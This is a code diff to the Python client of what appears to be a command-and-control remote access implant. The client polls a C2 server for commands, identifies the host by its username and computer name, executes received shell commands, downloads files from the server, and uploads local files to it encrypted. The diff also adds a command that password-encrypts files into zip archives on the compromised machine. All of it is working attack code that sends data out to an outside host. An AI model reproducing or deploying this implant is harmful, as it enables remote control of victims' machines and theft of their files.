@@ -1,15 +1,18 @@
 from time import time, sleep
+from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from requests import get, post, exceptions, put
 from subprocess import run, PIPE, STDOUT
 from encryption import cipher
 from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER,
-                      FILE_REQUEST, FILE_SEND)
-from os import getenv, chdir, getcwd
+                      FILE_REQUEST, FILE_SEND, ZIP_PASSWORD)
+
+from os import getenv, chdir, getcwd, path
 
 client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
           str(time()))
 
 encrypted_client = cipher.encrypt(client.encode()).decode()
+
 
 def post_to_server(message: str, response_path=RESPONSE):
     try:
@@ -19,9 +22,21 @@ def post_to_server(message: str, response_path=RESPONSE):
     except exceptions.RequestException:
         return
 
+
+def get_third_item(input_string, replace=True):
+    try:
+        if replace:
+            return input_string.split()[2].replace("\\", "/")
+        else:
+            return input_string.split()[2]
+    except IndexError:
+        post_to_server(f"You must enter an argument after {input_string}.\n")
+
+
 while True:
     try:
         response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
+        print(response.status_code)
         if response.status_code == 404:
             raise exceptions.RequestException
     except exceptions.RequestException:
@@ -50,34 +65,48 @@ while True:
         post_to_server(command_output.decode())
 
     elif command.startswith("client download"):
-        filename = None
+        filepath = get_third_item(command)
+        if filepath is None:
+            continue
+        filename = path.basename(filepath)
+        encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
         try:
-            filepath = command.split()[2]
-            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
-            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
             with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER,
                      proxies=PROXY) as response:
                 if response.status_code == 200:
                     with open(filename, "wb") as file_handle:
                         file_handle.write(cipher.decrypt(response.content))
                     post_to_server(f"{filename} is now on {client}.\n")
-        except IndexError:
-            post_to_server("You must enter the filename to download.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
     elif command.startswith("client upload"):
-        filepath = None
+        filepath = get_third_item(command)
+        if filepath is None:
+            continue
+        filename = path.basename(filepath)
+        encrypted_filename = cipher.encrypt(filename.encode()).decode()
         try:
-            filepath = command.split()[2]
-            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
-            encrypted_filename = cipher.encrypt(filename.encode()).decode()
             with open(filepath, "rb") as file_handle:
                 encrypted_file = cipher.encrypt(file_handle.read())
                 put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True,
                     proxies=PROXY, headers=HEADER)
-        except IndexError:
-            post_to_server("You must enter the filepath to upload.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to access {filepath} on {client}.\n")
+
+    elif command.startswith("client zip"):
+        filepath = get_third_item(command)
+        if filepath is None:
+            continue
+        filename = path.basename(filepath)
+        try:
+            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
+                zip_file.setpassword(ZIP_PASSWORD)
+                if path.isdir(filepath):
+                    post_to_server(f"{filepath} on {client} is a directory.  Only files can be zipped.\n")
+                else:
+                    zip_file.write(filepath, filename)
+                    post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
@@ -96,5 +125,3 @@ while True:
             post_to_server(f"{client} will sleep for {delay} seconds.\n")
             sleep(delay)
             post_to_server(f"{client} is now awake.\n")
-
-
